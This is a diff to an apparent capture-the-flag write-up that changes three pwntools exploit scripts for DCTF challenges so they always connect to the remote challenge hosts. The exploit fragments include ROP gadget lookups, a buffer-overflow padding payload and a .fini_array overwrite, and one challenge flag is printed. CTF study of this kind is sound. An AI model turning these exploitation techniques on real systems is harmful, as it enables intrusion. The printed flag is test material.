@@ -4,11 +4,7 @@
 from pwn import *
 
 binary = context.binary = ELF('./pwn_sanity_check')
-
-if args.REMOTE:
-    p = remote('dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io', 7480)
-else:
-    p = process(binary.path)
+p = remote('dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io', 7480)
 
 pop_rdi = next(binary.search(asm('pop rdi; ret')))
 pop_rsi_r15 = next(binary.search(asm('pop rsi; pop r15; ret')))
@@ -33,11 +29,7 @@ FLAG: ***``dctf{Ju5t_m0v3_0n}``***
 from pwn import *
 
 binary = context.binary = ELF('./pinch_me')
-
-if args.REMOTE:
-    p = remote('dctf1-chall-pinch-me.westeurope.azurecontainer.io', 7480)
-else:
-    p = process(binary.path)
+p = remote('dctf1-chall-pinch-me.westeurope.azurecontainer.io', 7480)
 
 payload  = b''
 payload += b'A' * 24
@@ -83,10 +75,7 @@ from pwn import *
 
 binary = context.binary = ELF('./magic_trick')
 
-if args.REMOTE:
-    p = remote('dctf-chall-magic-trick.westeurope.azurecontainer.io', 7481)
-else:
-    p = process(binary.path)
+p = remote('dctf-chall-magic-trick.westeurope.azurecontainer.io', 7481)
 
 p.sendlineafter('write\n', str(binary.sym.win))
 p.sendlineafter('it\n', str(binary.get_section_by_name('.fini_array').header.sh_addr))
